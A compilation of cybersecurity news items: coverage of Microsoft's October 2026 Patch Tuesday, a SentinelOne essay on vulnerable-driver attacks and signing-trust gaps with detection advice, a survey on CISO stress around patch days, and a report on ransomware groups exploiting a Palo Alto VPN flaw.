At least 78 of the flaws fixed this month are rated “critical,” meaning they could be exploited with little or no action by the user, and most of those critical bugs allow an attacker to execute code of their choice on the vulnerable system.

While Microsoft said there are no signs anyone is exploiting it yet, a security feature bypass in the .NET Framework (CVE-2026-108398) was publicly disclosed prior to today, potentially giving attackers advance time to work out how to exploit the bug.

Satnam Narang at Tenable said the number of flaws fixed this month far surpasses the previous record-setting year 2020, when Microsoft patched 1,261 CVEs.

“We’ve now crossed the 4,000 CVE mark with two months left to go,” he said.

Microsoft credits large language models for the high volume of bug discovery, and presumably AI gets credit for many of the patches used to fix these flaw. Meanwhile, security experts have been warning that these unusually large patch volleys from Microsoft are placing extra strain on corporate security teams, which often have to test individual updates before deploying them across a network to ensure the fixes don’t cause problems for other software.

Tyler Reguly, associate director of security research and development at Fortra, notes that just 26 Microsoft vulnerabilities appeared in the “Known Exploited Vulnerabilities” (KEV) catalog maintained by the U.S. Cybersecurity & Infrastructure Security Agency (CISA) so far this year, and security teams would do well to prioritize patching those 26 vulnerabilities first.

“Security leaders should focus on exploitable risk, and ask whether their teams have the clarity, capacity and support to act,” Reguly said.

Which vulnerabilities deserve the most scrutiny in your organization? The folks at Cisco Talos have a useful roundup of the more noteworthy flaws that Microsoft fixed today, and of course the SANS Internet Storm Center has a reliable roundup that indexes vulnerabilities by severity, CVE number and affected software.

Title: Patch Tuesday - October 2026
Context: exe and associated libraries and APIs, and for the second time this year, the Windows Shell is the site of an exploited-in-the-wild zero-day vulnerability
Full Text:
Microsoft is publishing 1,413 own-product vulnerabilities on October 2026 Patch Tuesday, including 1,102 vulnerabilities in Windows. Anyone who enjoyed last month’s record-setting Patch Tuesday will love the October 2026 edition, because it’s much bigger still. As Rapid7 has noted over the course of 2026, there is every reason to suppose that vulnerability volumes will continue to rise. Microsoft is aware of exploitation in the wild for just one of the vulnerabilities published today, as well as public disclosure for two others.

Windows Shell: zero-day security feature bypass

The Windows Shell is Microsoft’s term for the GUI interaction logic for the entire OS provided by explorer.exe and associated libraries and APIs, and for the second time this year, the Windows Shell is the site of an exploited-in-the-wild zero-day vulnerability. Today’s specimen is CVE-2026-96951. Once again, the immediate prize for an attacker is a Mark of the Web (MOTW) bypass. What this means is that Windows won’t provide the user with a dialog explaining that Windows protected their PC, because in this case, it didn’t. Exploitation requires that a user opens a specially crafted malicious file or visits an attacker-controlled site, so the evergreen advice about being careful what you click remains valid. Fans of vintage operating systems should note that Windows Server 2012 doesn’t receive a patch, although Server 2012 R2 does. The advisory acknowledges reporters from multiple organizations, although none from within Microsoft. The vulnerability also affected Microsoft’s Outlook.com cloud services, although Outlook.com was patched in a build dated several weeks ago.

.NET Framework: zero-day security feature bypass

Microsoft is aware of some level of public disclosure of CVE-2026-108398, a .NET Framework security feature bypass. Exploitation requires an attacker with an existing foothold to register a malicious .NET assembly for loading by a protected process, bypassing Windows Defender Application Control (WDAC) enforcement. Microsoft rebranded WDAC as App Control for Business several years ago, so you may know it under its new name. The Microsoft Learn page for Application Control for Windows points out that “your organization's data is one of its most valuable assets... and threat actors want it”, and this is, of course, correct. The patch presumably removes an attacker-controlled location from the list of places .NET Framework searches for registered assemblies, which are typically contained within DLLs and executables. If any further indications were needed that vulnerability volumes are increasing industry-wide, this is only the second month that Microsoft has published vulnerabilities with six-digit CVE numbers, but these extra-large CVEs will seem unremarkable from now on.

Outlook: multiple no-interaction RCEs

The sheer volume of vulnerabilities in recent Patch Tuesday releases can easily include several examples of potentially concerning vulnerabilities, each of which might have been more remarkable in its own right back when volumes were lower. Today, Microsoft has published five separate remote code execution vulnerabilities in Outlook where the preview pane is a vector, meaning that simply scrolling past an email in the Outlook reading pane would be sufficient to trigger exploitation. Worse still, Outlook might helpfully display the preview without any user interaction at all. All five of CVE-2026-70242, CVE-2026-97749, CVE-2026-97016, CVE-2026-88156, and CVE-2026-70291 receive fixes in the same patches. No-interaction Outlook preview pane vulnerabilities can sometimes feature prominently in state-backed actor campaigns, with CVE-2023-23397 as a prominent example in this category.

Edge: security updates unclear

In September 2026, Microsoft did not appear to publish any desktop browser security advisories between the start of the month and Patch Tuesday. In October, a slightly different approach has emerged: several recent entries in the Edge security updates release notes mention new versions of Edge which incorporate the latest updates from the Chromium project, but without detailing which vulnerabilities have been fixed, stating instead, “CVE's will be added as soon as available,” and directing readers to the Security Update Guide (SUG). At the time of writing, the SUG lists a total of zero vulnerabilities addressed in Edge in the first 13 days of October, and the “CVE’s added soon” message has been up for over a week. As a result, defenders have no obvious way of knowing which recent vulnerabilities Microsoft has addressed in Edge.

Microsoft lifecycle update

In Microsoft product lifecycle news, today sees Windows 11 24H2 Home & Pro reach end of servicing, while Windows Server 2022 moves to extended support, with free critical security updates continuing but no further feature development. Also this month, the final curtain falls for Windows Server 2012 and 2012 R2 with the expiry of the third and final year of cash-for-updates Extended Security Update (ESU) program for these aging workhorses. Microsoft lists the end of ESU Year 3 on October 14, 2026, in both cases. Microsoft has a long history of providing at least some security patches for products beyond the end of support, with Server 2008 being a case in point, but the time to move past Server 2012 is now. Office 2021 also moves into retirement on October 14; this includes the Long-Term Servicing Channel, with no ESU available in that case.

Also on October 15, 2026, Exchange Server 2016 and Exchange Server 2019 finally join the “no ESU” club, after two previous six-month reprieves. Microsoft seems to really mean it this time, since any future Exchange Server CVEs released by MSRC will stop mentioning Exchange 2016 and 2019. However, Microsoft points out that a lack of warnings does not mean those unsupported versions are not vulnerable to future security issues.

Title: Bring Your Own Vulnerable Driver: The Trust Gap Attackers Operate Inside
Context: Public threat research found a single GitHub PFX file holding more than a dozen expired certificates, drawn from the 2015 Hacking Team leak and Chinese forums
Full Text:
Bring your own vulnerable driver (BYOVD) is having a moment in endpoint security. Some of the buzz is earned. Some of it is overblown. This series unpacks both and shows the evidence for each. This piece weighs the trust gap the technique exploits against what the data actually shows.

A long-revoked certificate still loads a driver into the Windows kernel today. Help Net Security traced a 2026 intrusion to a decade-old forensic driver whose signing certificate had expired and been revoked years earlier. The kernel loaded it anyway.

The reason is structural, and it explains why the defensive target most teams chase is the wrong one. Defenders track bad drivers. We pull the LOLDrivers catalog, sync the default driver blocklist, and watch the list grow. The list is not where attackers compete. They compete over signing trust. A signature is the scarce thing. A driver is just the disposable wrapper around it.

Trust Is the Scarce Resource and Drivers are Disposable

Think about a stolen credit card. The number keeps clearing for hours or days in the gap before merchant blocklists sync. The thief does not need a new card. They need the window where the old one still works. Card networks did not win by perfecting the blocklist. They won by scoring the transaction itself in real time, regardless of whether the number was flagged yet.

Signed drivers run on the same broken model. The blocklist is the merchant blocklist. The signature is the card. Attackers live in the propagation gap, and that gap is wide.

The defensive move that follows is to stop chasing the card numbers and instrument the transaction. This is the reframe no competitor owns. Defend the trust anchor, because the list will always trail it. The anchor is the signing trust itself: revocation, signature metadata, and the slow death of cross-signed-driver trust. A list of bad drivers grows forever. The set of trust mechanisms that let those drivers load is small and addressable.

The web learned this lesson the hard way already. Online Certificate Status Protocol (OCSP) soft-fail meant a browser that could not reach the revocation responder simply trusted the certificate anyway. The kernel driver model carries the same flaw in a harsher setting. There is no soft-fail to debate, because the kernel does not ask the question at all.

The Proof Is In the Certificates

The economics favor the attacker because trust concentrates. Public threat research found a single GitHub PFX file holding more than a dozen expired certificates, drawn from the 2015 Hacking Team leak and Chinese forums. That one file forged signatures on thousands of malicious drivers.

A small set of compromised keys signs an unbounded supply of drivers. A few stolen keys against thousands of drivers means the list defenders maintain can never catch up. Block a driver and the cost is one recompile. Edit unauthenticated bytes, the file hash changes, and the same key signs a new artifact. The blocklist entry you just earned is already stale, because the signing key did not move and the key is the asset. SentinelOne®'s latest Annual Threat Report documents loaders that reintroduce effectively the same payload under fresh hashes to outpace simple hash-based blocking.

The trust-pyramid framing from that research describes a real structure. At the base sit individual drivers, cheap and disposable. Above them sit the end-entity certificates that sign batches of drivers, and at the apex sit the cross-signed certificate authorities the kernel anchors to. An attacker who climbs one level multiplies their reach across everything below it, and defenders who fight at the base are fighting where the attacker has infinite supply.

The same research showed how attackers manufacture fresh trust on demand. Tools forge signature timestamps, exploiting the pre-July-29-2015 cross-signed certificate exception by backdating a signature so it appears to predate the cutoff. An expired or revoked certificate becomes a working signing key again. The forgery does not break the trust chain. It satisfies it.

The kernel makes this worse by refusing to check revocation. Windows loads drivers signed with revoked certificates even when a local revocation list is present, and the decade-old forensic driver case showed the same failure in 2026. The operating system's kernel-mode signing policy accepts end-entity certificates issued before July 29, 2015 if they chain to a cross-signed authority. The policy codifies the loophole rather than closing it.

The defensive consequence follows directly. Blocking expired and revoked certificate driver loads, paired with the blocklist, beats the blocklist alone. The blocklist enumerates known-bad files one at a time. Revocation enforcement attacks the reusable key behind all of them, scaling against the attacker instead of with them.

A certificate authority revokes a key when it learns the key is compromised, and in a working system every consumer checks the revocation list and refuses the key. A revoked certificate carries a clear instruction, do not trust anything this key signs, and the kernel loads the driver anyway. The attacker did not defeat the trust system. They used the part of it that was never enforced.

The Driver Persistence Half-Life

Now the data. Against the LOLDrivers catalog, roughly one-third of catalogued vulnerable driver samples are not covered by the default blocklist. The June 19, 2026 pull puts it at 36 percent. That is 782 of 2,190 samples, absent from the default list. About 22 percent, 479 samples, load even with Hypervisor-Protected Code Integrity (HVCI) enabled.

Call this the Driver Persistence Half-Life, the signature data point of this argument.

Be honest about what that number is. The 36 and 22 percent figures are point estimates from a single computed pull against one blocklist version. The method is published and reproducible: parse the enforced HVCI SiPolicy and the official block rules against the LOLDrivers JSON, match by file hash, then by authenticode metadata, and pin both to a commit and a version.

The caveats matter. The denominator is the LOLDrivers catalog, not every driver that exists. "Not covered" means absent from the default block rules, not exploitable on a given host. Hash coverage is brittle, because an edit to unauthenticated bytes changes the hash without changing the abuse.

The corroboration is real, and it is fewer voices than it looks. The catalog's own coverage metrics report that many LOLDrivers entries sit off the default blocklist, and public threat research corroborates the cadence qualitatively, confirming that systems can be attacked with a driver not yet listed. Two open tools reproduce the check itself, Trail of Bits' HVCI-loldrivers-check and a community block-rules checker, but no genuinely independent second count of the exact figures exists yet.

The lag underneath the number is the real exposure. The default blocklist updates only periodically through Windows Update, roughly once or twice a year, and deliberately holds back some blocks to avoid breaking legitimate software. The minimum disclosure-to-block window is a calendar quarter, and the historical window has run to six months or more. Most of these vulnerable signed drivers are reachable without admin rights, so the exposure is wide and the door is low.

The on-device reality runs worse than the stated cadence. Public reporting documented a Windows 10 driver blocklist frozen at a December 2019 version until an October 2022 fix. That is a roughly three-year gap between the published cadence and what shipped on the machine. A defender reading the cadence would assume quarterly freshness. The endpoint disagreed for three years.

Per case, persistence runs to years. SentinelLABS disclosed Dell's dbutil_2_3.sys flaws in 2021, and the signed-but-vulnerable driver was still disabling security tooling in 2024. SentinelLABS noted that the driver's certificate had not been revoked, leaving it abusable long after disclosure.

The half-life metaphor is precise. The catalog grows faster than the blocklist can absorb it, so the gap widens rather than closes, a long, slow decay that the attacker schedules around.

The method is reproducible against your own fleet. Run the same hash and authenticode match against the drivers that actually load, and the result is a number that describes your real exposure, a measurement you can repeat each quarter. The durable claim stays the honest one: roughly one-third of catalogued vulnerable drivers are not blocked by default. The precise 36 and 22 percent belong to one computed pull, a snapshot with a published method attached.

Blocking Everything Breaks the Business

The obvious fix is to block every old driver. That fix is impractical, and the platform's own documentation says so plainly: the blocklist "isn't guaranteed to block every driver," and blocks are held back precisely to avoid breaking functionality.

Vulnerable drivers are dual-use. Public threat research catalogued how most abused drivers ship as legitimate software components first. The same signed driver that disables an EDR this week was a working hardware utility last week. The blocklist maintainer weighs one confirmed abuse against tens of thousands of working installs. The hold-back is a rational choice under that math, and the exact gap the attacker schedules into.

The reboot gap makes the DIY approach worse. Independent analysis of the blocklist notes that a driver the policy would block keeps running until the next reboot, so an in-progress kill chain survives the moment you activate the policy. The attack surface reduction (ASR) rule that blocks vulnerable signed drivers only stops a driver from being written to disk. It does not block one already present from loading. Defenders who think they have closed the gap have often only narrowed the entry path.

The platform is moving the trust anchor. A Windows security update in April 2026 removes default trust for cross-signed kernel drivers, directly targeting the loophole the timestamp-forgery and pre-2015 exceptions opened. This is the industry bending toward the right target, attacking the reusable signing key itself, which is the correct altitude.

It helps. It does not close the gap. The April change applies to default trust going forward, so the 36 percent that sit off the blocklist today are not retroactively addressed by changing tomorrow's trust rules. The half-life keeps running on the inventory that already exists.

A separate chokepoint also remains in play. Public threat research documented one EDR killer used by multiple ransomware gangs whose coordination point was a shared packer-as-a-service, with no shared driver tying them together. The packer became the chokepoint when the driver did not. That is the pattern to internalize. Each fix narrows one path and exposes the next. Tighten cross-signed trust and the attacker leans harder on forged timestamps. Close the timestamp loophole and they lean on the unsynced backlog. The trust model has many anchors, and the attacker only needs the cheapest one still standing.

This persistence is not an accident of the technique. It is the product of an industry on the other side. SentinelOne's latest Annual Threat Report describes the industrialization of the modern cyber breach, with mature automation accelerating intrusions at scale. A trust gap that one researcher could exploit becomes one that a tooled-up criminal market exploits at volume, which is why the half-life persists across so many drivers at once.

This piece builds on prior work. Independent security research argued that admin-to-kernel is not a serviced security boundary and that blocklists are largely performative. That critique is correct and it stands. The contribution here is a measured persistence half-life, the certificate-concentration evidence behind it, and a trust-anchor reframe detection engineers can act on.

Stop Chasing the List. Instrument the Failure.

The card networks made the stolen number unprofitable by scoring the transaction. Defenders should do the same with signed drivers. Watch the trust event, because the catalog entry arrives too late to matter.

That means instrumenting the load itself. Sysmon Event ID 6 logs every driver load with its hash, signer, signature, and signature status, and any non-Valid status warrants investigation. This telemetry is low-volume and high-value, which makes it cheap to monitor and hard to flood. The Splunk detection content keys on exactly this event, with an explicit note that the alert needs triage rather than blind firing.

Signature-status detection and first-seen anomaly detection catch what blocklist matching misses. Alert on any driver load whose signature status is not Valid, including untrusted root, explicit distrust, and bad or invalid signatures, and on any driver whose hash, signer, or version has never been seen on the host before. Both approaches key on the trust attribute, so the known-bad list never enters the decision and the alert fires whether or not anyone has catalogued the driver yet.

The CodeIntegrity Operational log confirms whether your blocklist policy actually applied. Event ID 3099 confirms the policy is loaded, a blocked load logs Event ID 3077, an audited load logs Event ID 3076, and Event ID 3089 carries the signature detail. Pairing the block events with the audit events proves which drivers the policy stopped, which turns coverage from an assumption into a measurement. Given the three-year staleness the frozen-blocklist case showed, that proof is not optional.

The behavioral chain is observable end to end. A service is created via sc.exe, logged as Sysmon Event ID 1, and a System Event 7045 fires for the service install. A driver loads under Event ID 6, then a device control call (IOCTL) drives termination against protected processes. Public threat research watched one such loop run a repeating, fixed-interval termination cycle in kernel mode, stepping past protected-process defenses (PPL), and recent killers also unregister EDR kernel callbacks as a distinct observable before terminating processes. Picus mapped the same sequence across cases. Each step is a tripwire on the trust event, and none of it depends on prior knowledge of the specific driver.

The order of the chain is what makes it durable. The driver name changes every campaign, but the structure does not. SentinelOne's latest Annual Threat Report makes the same point about the kernel: activity at that layer can blind user-space instrumentation and leave a manual disk scan an unreliable assurance of cleanliness. Detection keyed to that shape survives a recompile, and detection keyed to a hash does not.

The mental shift is the point. A driver list is a finite answer to an infinite problem, and the trust anchor is small, addressable, and already moving. SentinelLABS research has lived at that anchor for years. The team co-discovered the POORTRY and STONESTOP WHQL-signed toolkit that drove the security advisory ADV220005, and proposed Authenticode-metadata blocklisting before that was standard practice.

Defenders are not behind because the list is incomplete. They are behind because they were grading the wrong exam. Score the trust event, and the half-life stops being the attacker's advantage.

Why This Is the Work SentinelOne Exists To Do

Scoring the trust event instead of chasing the list is the whole argument, and it is the argument SentinelOne was built to win. The platform watches the load itself, the untrusted signature, the first-seen driver, and the masquerading kernel service, from a vantage designed to keep reporting when the kernel turns hostile. Purple AI® carries that telemetry forward. Its Agentic Investigation capability reasons over the trust event the moment it fires, builds the timeline, and renders a verdict in minutes and seconds rather than hours and days. The propagation gap the attacker lives inside narrows when the verdict arrives at machine speed.

A control you have not confirmed is running is a control you are only hoping for, and most teams cannot staff that verification around the clock. Wayfinder, SentinelOne's managed detection and response practice, holds the line when your own team is asleep, fusing human threat hunting with the platform's autonomous investigation and Google threat intelligence. That is the reason the company exists. The trust anchor is small and addressable, and the advantage goes to the defender who instruments it.

Title: Fifth of CISOs Take Time Off to Avoid Patch Tuesday
Context: Attackers Hide Malware Behind Signed ChatGPT and Claude Binaries Attackers Exploit Teams External Chat to Breach Organizations in Under 15 Minutes Online Scam Volumes Double to...
Full Text:
One-in-five cybersecurity leaders has either called in sick or deliberately booked holiday time off to avoid Patch Tuesday, according to new data from Socura.

The MDR specialist polled 500 UK CSOs, CISOs and heads of IT security to better understand their attitudes to AI and the once-a-month date where Microsoft, Adobe and other vendors release their latest security updates.

While a plurality (41%) revealed that they have worked overtime to manage the patching cycle and over a third (37%) claimed they’ve worked late to deploy patches, a significant 22% said they have tried to swerve the date altogether.

Socura laid the blame on a growing number of patches and rising stress levels. Over a quarter (29%) of respondents said they feel “significant anxiety” the night before Patch Tuesday. The same share admitted they become more irritable with colleagues or family during that week.

Read more on CISO stress: CISOs Urged to Innovate with Talent Retention as Job Satisfaction Declines.

“You expect your accountant to be available for your tax return deadline, and your lawyer for your court date,” argued Socura CEO, Andrew Kays. “It speaks volumes about the unhealthy levels of stress and burnout in our industry that cybersecurity leaders would deliberately avoid the office during their most consequential day of work.”

The workload is rising as AI-powered vulnerability research helps vendors to discover software flaws in greater volumes. Microsoft fixed a record 974 CVEs in its September 2026 Patch Tuesday release, beating the previous record of 570 just two months prior.

By comparison, just 1130 vulnerabilities were published in the whole of 2025.

The data chimes with previous reports on CISO stress levels. In March 2026, a Seemplicity report revealed that 45% of cybersecurity leaders work 11+ extra hours per week – equivalent to an additional day – and 20% work an extra 16+ hours weekly.

A further two-fifths (43%) said they’re unable to take time off without creating a huge amount of stress upon their return.

“It's vital that security teams are properly resourced on Patch Tuesday, and that cybersecurity workers are properly supported emotionally, technically, and financially,” said Kays. “It's a tough job, and most people do it because they love it. That shouldn't be forgotten or exploited.”

AI Can Also Help

The good news for CISOs is that AI could also help to make certain aspects of the job less stressful.

Two-fifths (40%) of respondents told Socura that the technology automates mundane work, which in turn frees up teams to focus on more strategic tasks.

A similar share (37%) claimed that AI is helping them better protect their core corporate infrastructure against active threats.

Title: Months-Old Palo Alto VPN Vulnerability Remains a Target for Ransomware Groups
Context: Attackers Hide Malware Behind Signed ChatGPT and Claude Binaries Attackers Exploit Teams External Chat to Breach Organizations in Under 15 Minutes Online Scam Volumes Double to...
Full Text:
Ransomware groups continue to target a high-severity vulnerability in Palo Alto Networks products, despite a security patch being released five months ago, according to ReliaQuest.

The cyber threat detection provider warned in a social media advisories posted on October 9 that multiple groups, including the Qilin and Settra ransomware operations, are actively targeting CVE-2026-0257 to establish unauthorized VPN sessions and gain initial access to internal networks.

CVE-2026-0257 is an authentication bypass vulnerability in PAN-OS GlobalProtect and Prisma Access that affects several Palo Alto Networks products, including PAN-OS versions 10.2.0, 11.1.0, 11.2.0 and 12.1.0 and two versions of Prisma Access (10.2.0 and 11.2.0).

It was discovered by Palo Alto Networks, which disclosed it on May 13, 2026, allocating it a 7.8 severity score (CVSS) and a “highest” urgency rating.

Alternatively, the vulnerability enrichment team at the US National Vulnerability Database (NVD), part of the US National Institute of Standards and Technology (NIST), allocated the flaw a critical severity rating of 9.1.

Palo Alto also released fixed versions that customers were urged to deploy to mitigate the threat, saying it had “become aware of limited exploit attempts on unpatched PAN-OS devices without mitigations applied.”

The vulnerability was added to the US Cybersecurity and Infrastructure Security Agency's (CISA) Known Exploited Vulnerabilities (KEV) list on May 29, with US federal agencies urged to apply remediation by June 1.

Despite these warnings, some systems appear to remain unpatched, with multiple threat intelligence teams reporting attempted exploitation of CVE-2026-0257 in recent months. These include Rapid7 in late May, Palo Alto’s own Unit 42 in June and Artic Wolf in July.

Read more: Palo Alto Warns High-Severity Bug Is Being Actively Exploited

Organizations Urged to Patch and Add Mitigation Measures

Now, ReliaQuest confirmed that the Qilin and Settra ransomware groups are actively exploiting the flaw, with observed accompanying deployment of offensive security tools, such as Cobalt Strike, BloodHound and SharpHound.

The threat detection provider also assessed it “highly likely” these groups will continue exploitation attempts over the next three months.

“Because this access originates through an organization’s own VPN, malicious activity can resemble legitimate remote work and may go undetected until credential theft, lateral movement, data theft or ransomware deployment is underway,” the threat detection provider said.

Organizations still running vulnerable Palo Alto products should “immediately upgrade affected deployments, disable authentication override cookies where they are not required, terminate all active GlobalProtect sessions after patching and investigate unexpected connections, including sessions using hostnames such as ‘kali,’” ReliaQuest added.

“Patching alone may not remove access established before remediation,” it cautioned.

Title: Threat Actors Exploit Critical AhsayCBS Flaws to Drop Webshells and XMRig Cryptominer
